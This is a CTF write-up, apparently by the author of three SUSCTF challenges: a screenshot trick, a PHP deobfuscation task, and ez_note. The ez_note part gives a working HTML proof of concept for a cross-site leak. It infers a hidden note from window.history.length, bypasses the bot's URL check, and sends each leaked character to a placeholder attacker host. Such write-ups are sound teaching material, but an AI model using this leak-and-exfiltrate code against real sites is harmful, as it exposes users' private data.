# checkin & ez\_note & rubbish maker wp
please forgive my poor english.

## checkin
pls read challenge description carefully
PM bot send `>flag` it will give you flag, but edit it quickly.
just use screenshot to get flag

## ez\_note

### tl;dr
xs leak window.history

### solution
this challenge is not a xss challenge, but a xs leak one. 
Though there is a `unsafe-inline`in the CSP,  it is used for the redirection script. I used it instead of nonce for the redirection script(because i think this could convince players it is a xss challenge). In fact, there isn't any xss vulnerability, every output has been escaped. And users can't see their notes with each other. I had mention it in the note creation interface. You can also register two accounts to prove it. I also publicize the flag format as a hint which indicate it is a xs leak challenge.
That means it isn't a xss challenge, and we noticed there is a search function in this website, which would redirect user when there is only one search result. We can use this different to get admin's note.
The logic of bot is in the attachment, bot use nodejs URL class to create visit url, and I have assigned the `base` to the ez_note's site, user input is the `path` arg, like this: `let url = new URL(path, site)`
However, if you look into the document, when path is absolute, the base is ignored.
```javascript
let myURL = new URL('http://Example.com/', 'https://example.org/');
// http://example.com/

myURL = new URL('https://Example.com/', 'https://example.org/');
// https://example.com/

myURL = new URL('foo://Example.com/', 'https://example.org/');
// foo://Example.com/
```

so we can easily bypass the url restriction by just input an absolute url. Now we need to use that search function to leak admin's note. There is a X-Frame-Option restrict frame include to same origin. Website cookie's samesite attribute is set to lax. Thus there is no way to use iframe. So we choose `window`, which can bypass the samesite cookie. When exploiting xs leak, we need to figure out the differece between the different behaviors. In this challenge it is the redirection for the only match. If there is a redirection, the window's history attribute's length will increase. 

there is a poc:
```html
<!DOCTYPE html>
<html lang="en">
<body onload=exp()>
</body>
<script>
    function exp(){
        let charset = "1234567890_qwertyuiopasdfghjklzxcvbnm"
        for(let c of charset){
            test(c)
        }
    }
    function test(c) {
        let win = open("http://123.60.29.171:10001/search?q=SUSCTF{"+ c )

        setTimeout(()=>{win.location="http://ip"}, 2000)
        setTimeout(()=>{
            console.log(c)
            console.log(win.history.length)
            if(win.history.length === 3)
            {
                fetch("http://ip/?" + c)
            }
        }, 4000)
        setTimeout(()=>{
            win.close()
        }, 5000)
    }

</script>
</html>
```

## rubbish maker
This challenge is a php code obfuscator based on [PHP-Parser](https://github.com/nikic/PHP-Parser). You can check out my source code and solution [here](https://github.com/Z3ratu1/my_ctf_challenge/tree/main/SUSCTF2022/rubbish_maker). It is composed by four part: `NameObfuscator`, `ScalarObfuscator`, `ControlFlowFlattener` and `LogicShuffler`.

You can better understand it's logic after check these code.

I wrote a obfuscator with syntax analysis in order to prevent some player use some black magics like python or regexp. I alse add some anti-debugger code and disrupt control flow to prevent debug(but I don't know anything about anti-debug, so i just copy some code from Internet, I hope it works). In this challenge, I hope players to restore the code through AST rather than write lots of regexp to replace it.

There is a function at the begining of the code, and it almost be called in everywhere in the rest of the code. Obviously, we need to restore this function. There are 3 main statements in this function, `goto`, `if`, `return`, it accept one param then use it to get a return value. The first statement of this function is define a variable. Then it xor with the input param to check out which value to return, we can use xor to get the code which we need to get the corresponding return value. There are some players just run this function to get the return value, which is a excellent idea. After solved the function, we need to deal with the main code logic. However, there is only some goto statement, so it wouldn't be very hard. But there is some fake goto may lead to endless loop. If you can figure out the goto statement which go back to the previous label is fake, you can solve it easily.
